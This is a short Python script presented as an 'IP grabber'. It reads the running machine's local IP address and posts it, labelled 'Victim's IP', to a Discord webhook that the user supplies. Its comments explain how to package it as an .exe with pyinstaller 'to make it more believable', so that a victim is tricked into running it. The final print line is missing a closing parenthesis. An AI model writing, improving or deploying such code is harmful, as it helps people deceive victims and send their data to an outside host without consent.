import requests
from urllib.request import Request, urlopen
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))

url = "Your Webhook URL Here" 
#How to create a Discord Webhook URL: Server Settings >> Integration >> Webhooks >> New Webhook >> Copy the URL
data = {
    "content" : "IP Grabbed Successfully",
    "username" : "Mr. IP Grabber"
}


data["embeds"] = [
    {
        "description" : s.getsockname()[0],
        "title" : "Victim's IP"
    }
]

result = requests.post(url, json = data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print("Payload delivered successfully, code {}.".format(result.status_code)
#Convert this into a .exe to make it more believable with pyinstaller
#Add Python to path >> Open CMD >> pip install pyinstaller >> cd the_directory_of_the_ip_grabber >> pyinstaller --onefile "IP Grabber.py" >> Open the directory >> open dist >> The .exe should be there

